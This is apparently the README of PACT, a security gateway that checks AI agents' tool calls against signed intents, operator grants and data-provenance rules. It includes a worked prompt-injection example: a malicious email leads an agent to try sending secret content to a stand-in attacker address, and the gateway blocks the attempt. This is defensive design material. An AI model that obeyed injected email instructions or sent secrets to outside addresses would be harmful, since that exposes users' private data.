<p align="center">
  <img src="docs/assets/pact-banner.svg" alt="PACT — Provenance-Aware Capability Tokens for AI Agents" width="620">
</p>

PACT is a runtime security layer for AI agents. Every tool call an agent makes
passes through a signed gateway that verifies *who* is acting, *whether the
action matches the user's intent*, *whether it is within an operator-authorized
scope*, and *whether untrusted or secret data is flowing where it shouldn't* —
before the tool runs. Every decision is written to a tamper-evident ledger.

> Authentication asks *"is this caller allowed into the system?"*
> PACT asks *"is **this action** legitimate **in this context**, and was it
> influenced by untrusted or secret data?"* — and enforces the answer.

---

## How it works

An agent cannot call tools directly. It must wrap each call in a signed **Action
Envelope** and submit it to the **Gateway** — the single trust boundary.

```
User → Agent → PACT Envelope → Gateway ──► ALLOW / BLOCK / REQUIRE_APPROVAL → Ledger → SOC Dashboard
                                  │
        passport · signature · intent · capability · resource scope · provenance · policy
```

Enforcement is **structural, not pattern-matching**. PACT does not block actions
by recognizing bad strings like `.env` or `attacker@gmail.com`; it blocks them
because the capability isn't granted, the resource is out of the authorized
scope, or secret/untrusted data would flow to an external sink.

## Security model

| Primitive | Purpose |
|---|---|
| **Agent Passport** | Issuer-signed Ed25519 identity, verified on every call |
| **Intent Contract** | Locks the allowed actions to the user's goal; tamper-evident hash |
| **Operator Grant** | Deny-by-default ceiling on *tools* and *resource scope* — the authority the agent cannot widen |
| **Capability Token** | Short-lived, scoped, intent-bound, signed, use-limited permission |
| **Provenance / Taint** | Tracks trusted / untrusted / secret / generated data and propagates it across steps |
| **Policy Engine** | Evaluates identity + intent + capability + resource scope + provenance → decision + risk |
| **Tamper-Evident Ledger** | Hash-chained record of every attempted action |
| **SOC Dashboard + Replay** | Visual monitoring and step-by-step reconstruction of agent behavior |

**Least privilege from the operator, not the agent.** An operator *grant* defines
the hard ceiling — which tools, and an allowlist of resources per type (email
domains, URL hosts, file-path globs). The default grant is deny-by-default: no
outbound email, secret reads, or shell until explicitly authorized. The agent's
per-task intent can only narrow within the grant.

**Policy rules (R1–R12).** Full spec in [docs/PROTOCOL.md](docs/PROTOCOL.md).

| Rule | Condition | Decision |
|---|---|---|
| R1–R3 | Invalid passport / signature / capability token | BLOCK |
| R4–R5 | Tool not in intent's allowed (or in forbidden) actions | BLOCK |
| R12 | Requested resource outside the operator-authorized scope | BLOCK |
| R6–R8 | Untrusted (email/web) or secret data + external write | BLOCK |
| R9 | Shell execution | REQUIRE_APPROVAL |
| R11 | Read of a critical-sensitivity resource (e.g. `.env`) | REQUIRE_APPROVAL |
| R10 | Unknown / unregistered tool | BLOCK |
| — | Valid identity + intent + scope + provenance | ALLOW |

### Example — exfiltration is blocked structurally

A prompt-injected agent reads a malicious email, then attempts
`email.send(to="attacker@evil.com")` with secret content. PACT blocks it on
multiple independent grounds, none of which require naming the threat:

- `attacker@evil.com` is **outside the authorized email scope** (R12)
- the action is influenced by `untrusted.email` and is an `external_write` (R6)
- secret data would flow to an external destination (R8)

Rename the file or change the address — it's still blocked, because the
authority and data-flow boundaries don't depend on the specific strings.

## Quick start

**Prerequisites:** Python 3.10+, Node.js 18+.

```bash
# Backend (API at http://localhost:8000, docs at /docs)
cd backend
python -m venv venv && source venv/bin/activate    # Windows: venv\Scripts\activate
pip install -r requirements.txt
cp .env.example .env
uvicorn app.main:app --reload --port 8000

# Frontend (dashboard at http://localhost:5173)
cd frontend && npm install && npm run dev

# Tests
cd backend && pytest -q
```

### Interactive agent CLI

Run a real Claude/Gemini/Bedrock agent whose tools are enforced by PACT. Its
runs appear live in the dashboard.

```bash
python3 pact_chat.py --provider claude
# Widen authority with an operator grant (deny-by-default otherwise):
python3 pact_chat.py --provider claude --grant examples/grant.acme.yaml
```

The header shows the active grant and authorized tools; `/tools` lists what is
authorized vs. blocked. See [docs/LOCAL_TESTING.md](docs/LOCAL_TESTING.md) for an
end-to-end walkthrough.

## Architecture

```
backend/app/
  core/        runtime, factory, tool registry, grants, policy config
  crypto/      Ed25519 keys, signing, canonical hashing
  services/    passport · intent · capability · envelope · provenance ·
               policy · ledger · gateway · approval
  api/v1/      agents · intents · capabilities · actions · policies ·
               approvals · runs
  adapters/    LangChain / LangGraph enforcement wrappers
  tools/       tool implementations + resource extraction/scope
frontend/src/  React + Vite SOC dashboard (overview, runs, graph, replay)
pact_chat.py   interactive PACT-protected agent CLI
```

**Stack:** FastAPI · async SQLAlchemy · PyNaCl (Ed25519) · Pydantic v2 · Pytest
on the backend; React 18 · Vite · Tailwind · React Flow · Recharts on the frontend.

## Documentation

| Document | Description |
|---|---|
| [docs/PROTOCOL.md](docs/PROTOCOL.md) | Protocol spec: primitives, security model, policy rules, risk scoring, threat model |
| [docs/API.md](docs/API.md) | REST API reference — endpoints, request/response, curl examples |
| [docs/LOCAL_TESTING.md](docs/LOCAL_TESTING.md) | End-to-end local testing walkthrough |
| [progress.md](progress.md) | Current status and changelog |
| [road_to_prod.md](road_to_prod.md) | Roadmap from here to production |

## Status

**v0.0.1** — least-privilege authority and structural data-flow enforcement.
257 tests passing. Forward work (object-level taint, identity/authz + API auth,
a real policy engine, Postgres/Alembic, SDK + MCP gateway) is tracked in
[road_to_prod.md](road_to_prod.md).

## License

MIT
